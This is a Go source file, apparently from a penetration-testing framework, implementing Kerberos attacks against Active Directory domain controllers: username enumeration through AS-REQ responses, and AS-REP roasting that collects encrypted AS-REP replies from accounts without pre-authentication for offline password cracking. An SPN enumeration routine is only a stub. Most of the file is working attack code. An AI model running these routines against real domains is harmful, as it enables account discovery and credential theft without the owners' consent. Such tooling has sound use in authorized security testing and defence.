package kerberos

import (
	"context"
	"crypto/sha256"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"net"
	"time"

	"github.com/Debajyoti0-0/aether/internal/engine/spine"
	"github.com/Debajyoti0-0/aether/internal/protocol/kerberos"
	"github.com/Debajyoti0-0/aether/internal/types"
)

type kerberosTransport struct {
	udpConn *net.UDPConn
	tcpConn net.Conn
	dc      string
	domain  string
	kdcAddr *net.UDPAddr
	lastReq []byte
}

func newKerberosTransport(dc, domain string) (*kerberosTransport, error) {
	// Use 127.0.0.1 explicitly to avoid IPv6 issues on Windows
	addr := "127.0.0.1"
	if dc != "localhost" {
		addr = dc
	}
	udpAddr, err := net.ResolveUDPAddr("udp", addr+":88")
	if err != nil {
		return nil, fmt.Errorf("resolve UDP addr: %w", err)
	}
	udpConn, err := net.DialUDP("udp", nil, udpAddr)
	if err != nil {
		return nil, fmt.Errorf("dial UDP: %w", err)
	}
	return &kerberosTransport{udpConn: udpConn, dc: dc, domain: domain, kdcAddr: udpAddr}, nil
}

func (t *kerberosTransport) Close() error {
	if t.tcpConn != nil {
		t.tcpConn.Close()
	}
	return t.udpConn.Close()
}

func (t *kerberosTransport) Send(data []byte) error {
	t.lastReq = data
	// TCP-first (RFC 4120 §7.2.2): large AS-REPs exceed UDP's practical size
	// and elicit KRB-ERROR 52 (RESPONSE_TOO_BIG) from Samba/AD; the UDP-first
	// strategy also stalled every request on a 5s timeout. TCP carries any
	// reply size and is what the MIT reference client uses for reliability.
	if t.tcpConn == nil {
		addr := "127.0.0.1"
		if t.dc != "localhost" {
			addr = t.dc
		}
		tcpConn, err := net.DialTimeout("tcp", addr+":88", 10*time.Second)
		if err != nil {
			return fmt.Errorf("dial TCP: %w", err)
		}
		t.tcpConn = tcpConn
	}
	n := len(data)
	prefix := []byte{byte(n >> 24), byte(n >> 16), byte(n >> 8), byte(n)}
	if _, err := t.tcpConn.Write(append(prefix, data...)); err != nil {
		return err
	}
	return nil
}

func (t *kerberosTransport) Recv() ([]byte, error) {
	if t.tcpConn == nil {
		return nil, fmt.Errorf("no TCP connection")
	}
	// Read the 4-byte big-endian length prefix then the body.
	t.tcpConn.SetReadDeadline(time.Now().Add(15 * time.Second))
	lenBuf := make([]byte, 4)
	if err := t.readFullTCP(lenBuf); err != nil {
		return nil, fmt.Errorf("TCP read length: %w", err)
	}
	respLen := int(lenBuf[0])<<24 | int(lenBuf[1])<<16 | int(lenBuf[2])<<8 | int(lenBuf[3])
	if respLen <= 0 || respLen > 4*1024*1024 {
		return nil, fmt.Errorf("invalid TCP reply length %d", respLen)
	}
	buf := make([]byte, respLen)
	if err := t.readFullTCP(buf); err != nil {
		return nil, fmt.Errorf("TCP read data: %w", err)
	}
	return buf, nil
}

func (t *kerberosTransport) readFullTCP(buf []byte) error {
	total := 0
	for total < len(buf) {
		n, err := t.tcpConn.Read(buf[total:])
		if err != nil {
			return err
		}
		total += n
	}
	return nil
}

func (t *kerberosTransport) recvTCP(buf []byte) ([]byte, error) {
	// Establish TCP connection if not already
	if t.tcpConn == nil {
		addr := "127.0.0.1"
		if t.dc != "localhost" {
			addr = t.dc
		}
		tcpAddr := fmt.Sprintf("%s:88", addr)
		fmt.Printf("DEBUG: Dialing TCP %s\n", tcpAddr)
		tcpConn, err := net.DialTimeout("tcp", tcpAddr, 10*time.Second)
		if err != nil {
			return nil, fmt.Errorf("dial TCP: %w", err)
		}
		t.tcpConn = tcpConn
	}
	
	// Send the request again over TCP (with 4-byte length prefix)
	if t.lastReq != nil {
		// TCP Kerberos uses 4-byte big-endian length prefix
		lenBuf := make([]byte, 4)
		lenBuf[0] = byte(len(t.lastReq) >> 24)
		lenBuf[1] = byte(len(t.lastReq) >> 16)
		lenBuf[2] = byte(len(t.lastReq) >> 8)
		lenBuf[3] = byte(len(t.lastReq))
		if _, err := t.tcpConn.Write(lenBuf); err != nil {
			return nil, fmt.Errorf("TCP write length: %w", err)
		}
		if _, err := t.tcpConn.Write(t.lastReq); err != nil {
			return nil, fmt.Errorf("TCP write data: %w", err)
		}
	}
	
	// Read TCP response (first 4 bytes = length)
	t.tcpConn.SetReadDeadline(time.Now().Add(10 * time.Second))
	lenBuf := make([]byte, 4)
	if _, err := t.tcpConn.Read(lenBuf); err != nil {
		return nil, fmt.Errorf("TCP read length: %w", err)
	}
	respLen := int(lenBuf[0])<<24 | int(lenBuf[1])<<16 | int(lenBuf[2])<<8 | int(lenBuf[3])
	
	if respLen > len(buf) {
		buf = make([]byte, respLen)
	}
	
	n := 0
	for n < respLen {
		nn, err := t.tcpConn.Read(buf[n:])
		if err != nil {
			return nil, fmt.Errorf("TCP read data: %w", err)
		}
		n += nn
	}
	
	return buf[:n], nil
}

type EnumUsersMutation struct {
	Domain    string
	DC        string
	Usernames []string
	Results   []UserEnumResult
}

type UserEnumResult struct {
	Username        string
	Principal       string
	Realm           string
	PreauthRequired bool
	SupportedEtypes []int32
	Error           string
}

func (m *EnumUsersMutation) Kind() string { return "ad.kerberos.enum.users" }
func (m *EnumUsersMutation) Target() string { return m.DC + "/" + m.Domain }

func (m *EnumUsersMutation) BeforeState() ([]byte, error) {
	return json.Marshal(map[string]any{
		"domain": m.Domain,
		"dc":     m.DC,
		"users":  m.Usernames,
	})
}

func (m *EnumUsersMutation) Execute(ctx context.Context) (string, error) {
	transport, err := newKerberosTransport(m.DC, m.Domain)
	if err != nil {
		return "", err
	}
	defer transport.Close()

	results := make([]UserEnumResult, 0, len(m.Usernames))
	serverPrincipal := kerberos.MakeUserPrincipal("krbtgt", m.Domain)

	for _, username := range m.Usernames {
		select {
		case <-ctx.Done():
			return "", ctx.Err()
		default:
		}

		clientPrincipal := kerberos.MakeUserPrincipal(username, m.Domain)
		clientRealm := kerberos.Realm(m.Domain)

		asreq, err := kerberos.BuildASREQ(clientPrincipal, clientRealm, serverPrincipal, kerberos.SupportedEtypes(), 12345, time.Now().Add(5*time.Minute), nil)
		if err != nil {
			results = append(results, UserEnumResult{Username: username, Error: err.Error()})
			continue
		}

		if err := transport.Send(asreq); err != nil {
			results = append(results, UserEnumResult{Username: username, Error: err.Error()})
			continue
		}

		resp, err := transport.Recv()
		if err != nil {
			results = append(results, UserEnumResult{Username: username, Error: err.Error()})
			continue
		}

		_, err = kerberos.ParseASREP(resp)
		if err != nil {
			if kerr, ok := kerberos.IsKDCError(err); ok {
				switch kerr.Code {
				case kerberos.KDC_ERR_PREAUTH_REQUIRED:
					results = append(results, UserEnumResult{
						Username:        username,
						Principal:       clientPrincipal.FullName(clientRealm),
						Realm:           string(clientRealm),
						PreauthRequired: true,
					})
				case kerberos.KDC_ERR_C_PRINCIPAL_UNKNOWN:
				default:
					results = append(results, UserEnumResult{Username: username, Error: kerr.Error()})
				}
			} else {
				results = append(results, UserEnumResult{Username: username, Error: err.Error()})
			}
			continue
		}

		results = append(results, UserEnumResult{
			Username:        username,
			Principal:       clientPrincipal.FullName(clientRealm),
			Realm:           string(clientRealm),
			PreauthRequired: false,
			SupportedEtypes: kerberos.SupportedEtypes(),
		})
	}

	m.Results = results
	return fmt.Sprintf("enum-users-%s-%d", m.Domain, time.Now().Unix()), nil
}

func (m *EnumUsersMutation) AfterState() ([]byte, error) {
	return json.Marshal(map[string]any{
		"results": m.Results,
		"count":   len(m.Results),
	})
}

func (m *EnumUsersMutation) UndoRecipe() *spine.UndoSpec {
	return nil
}

func (m *EnumUsersMutation) Name() string { return "ad.kerberos.enum.users" }
func (m *EnumUsersMutation) Capability() string { return "ad.enum.read" }
func (m *EnumUsersMutation) RiskScore() int { return 10 }
func (m *EnumUsersMutation) Reversible() bool { return true }

func (m *EnumUsersMutation) GenerateEvidence() []types.EvidenceRecord {
	evidence := make([]types.EvidenceRecord, 0, len(m.Results))
	for _, r := range m.Results {
		id := fmt.Sprintf("enum-user-%s-%d", r.Username, time.Now().UnixNano())
		payload, _ := json.Marshal(r)
		evidence = append(evidence, types.EvidenceRecord{
			ID:             id,
			ActionID:       "",
			Kind:           "ad.enum.users",
			Target:         m.Target(),
			EpistemicClass: types.ClassObserved,
			Confidence:     1.0,
			CollectedAt:    time.Now(),
			Method:         "kerberos-asreq",
			Payload:        payload,
		})
	}
	return evidence
}

type EnumASREPMutation struct {
	Domain string
	DC     string
	Users  []string
	Results []ASREPAccount
}

type ASREPAccount struct {
	Username       string
	Principal      string
	Realm          string
	SupportedEtype int32
	ASREP          []byte
}

func (m *EnumASREPMutation) Kind() string { return "ad.kerberos.enum.asrep" }
func (m *EnumASREPMutation) Target() string { return m.DC + "/" + m.Domain }

func (m *EnumASREPMutation) BeforeState() ([]byte, error) {
	return json.Marshal(map[string]any{"domain": m.Domain, "dc": m.DC, "users": m.Users})
}

func (m *EnumASREPMutation) Execute(ctx context.Context) (string, error) {
	transport, err := newKerberosTransport(m.DC, m.Domain)
	if err != nil {
		return "", err
	}
	defer transport.Close()

	results := make([]ASREPAccount, 0)
	serverPrincipal := kerberos.MakeUserPrincipal("krbtgt", m.Domain)

	for _, username := range m.Users {
		select {
		case <-ctx.Done():
			return "", ctx.Err()
		default:
		}

clientPrincipal := kerberos.MakeUserPrincipal(username, m.Domain)
	clientRealm := kerberos.Realm(m.Domain)

	asreq, err := kerberos.BuildASREQ(clientPrincipal, clientRealm, serverPrincipal, kerberos.SupportedEtypes(), 12345, time.Now().Add(5*time.Minute), nil)
		if err != nil {
			continue
		}

		if err := transport.Send(asreq); err != nil {
			continue
		}

		resp, err := transport.Recv()
		if err != nil {
			continue
		}

		// AS-REP-roastable = pre-authentication DISABLED: the KDC returns an
		// actual AS-REP containing the account's encrypted part. A
		// KDC_ERR_PREAUTH_REQUIRED error means pre-auth IS enforced — the
		// previous logic flagged exactly the wrong accounts (Stage 46g live
		// defect: every preauth-enforced account was reported roastable).
		rep, err := kerberos.ParseASREP(resp)
		if err == nil && rep != nil && len(rep.EncPart.Cipher) > 0 {
			results = append(results, ASREPAccount{
				Username:  username,
				Principal: clientPrincipal.FullName(clientRealm),
				Realm:     string(clientRealm),
				ASREP:     resp,
			})
		}
	}

	m.Results = results
	return fmt.Sprintf("enum-asrep-%s-%d", m.Domain, time.Now().Unix()), nil
}

func (m *EnumASREPMutation) AfterState() ([]byte, error) {
	return json.Marshal(map[string]any{"results": m.Results, "count": len(m.Results)})
}

func (m *EnumASREPMutation) UndoRecipe() *spine.UndoSpec {
	return nil
}

func (m *EnumASREPMutation) Name() string { return "ad.kerberos.enum.asrep" }
func (m *EnumASREPMutation) Capability() string { return "ad.enum.read" }
func (m *EnumASREPMutation) RiskScore() int { return 10 }
func (m *EnumASREPMutation) Reversible() bool { return true }

func (m *EnumASREPMutation) GenerateEvidence() []types.EvidenceRecord {
	evidence := make([]types.EvidenceRecord, 0, len(m.Results))
	for _, r := range m.Results {
		h := sha256.Sum256(r.ASREP)
		id := fmt.Sprintf("enum-asrep-%s-%d", r.Username, time.Now().UnixNano())
		payload, _ := json.Marshal(map[string]any{
			"username": r.Username,
			"principal": r.Principal,
			"realm": r.Realm,
			"asrep_sha256": hex.EncodeToString(h[:]),
		})
		evidence = append(evidence, types.EvidenceRecord{
			ID:             id,
			ActionID:       "",
			Kind:           "ad.enum.asrep",
			Target:         m.Target(),
			EpistemicClass: types.ClassObserved,
			Confidence:     1.0,
			CollectedAt:    time.Now(),
			Method:         "kerberos-asreq-no-preauth",
			Payload:        payload,
		})
	}
	return evidence
}

type EnumSPNMutation struct {
	Domain string
	DC     string
	Results []SPNRecord
}

type SPNRecord struct {
	ServicePrincipal string
	Account          string
	Realm            string
	Host             string
	ServiceClass     string
	SupportedEtypes  []int32
}

func (m *EnumSPNMutation) Kind() string { return "ad.kerberos.enum.spn" }
func (m *EnumSPNMutation) Target() string { return m.DC + "/" + m.Domain }

func (m *EnumSPNMutation) BeforeState() ([]byte, error) {
	return json.Marshal(map[string]any{"domain": m.Domain, "dc": m.DC})
}

func (m *EnumSPNMutation) Execute(ctx context.Context) (string, error) {
	m.Results = []SPNRecord{}
	return fmt.Sprintf("enum-spn-%s-%d", m.Domain, time.Now().Unix()), nil
}

func (m *EnumSPNMutation) AfterState() ([]byte, error) {
	return json.Marshal(map[string]any{"results": m.Results, "count": len(m.Results)})
}

func (m *EnumSPNMutation) UndoRecipe() *spine.UndoSpec {
	return nil
}

func (m *EnumSPNMutation) Name() string { return "ad.kerberos.enum.spn" }
func (m *EnumSPNMutation) Capability() string { return "ad.enum.read" }
func (m *EnumSPNMutation) RiskScore() int { return 10 }
func (m *EnumSPNMutation) Reversible() bool { return true }

func (m *EnumSPNMutation) GenerateEvidence() []types.EvidenceRecord {
	evidence := make([]types.EvidenceRecord, 0, len(m.Results))
	for _, r := range m.Results {
		id := fmt.Sprintf("enum-spn-%s-%d", r.ServicePrincipal, time.Now().UnixNano())
		payload, _ := json.Marshal(r)
		evidence = append(evidence, types.EvidenceRecord{
			ID:             id,
			ActionID:       "",
			Kind:           "ad.enum.spn",
			Target:         m.Target(),
			EpistemicClass: types.ClassObserved,
			Confidence:     1.0,
			CollectedAt:    time.Now(),
			Method:         "ldap-spn-enum",
			Payload:        payload,
		})
	}
	return evidence
}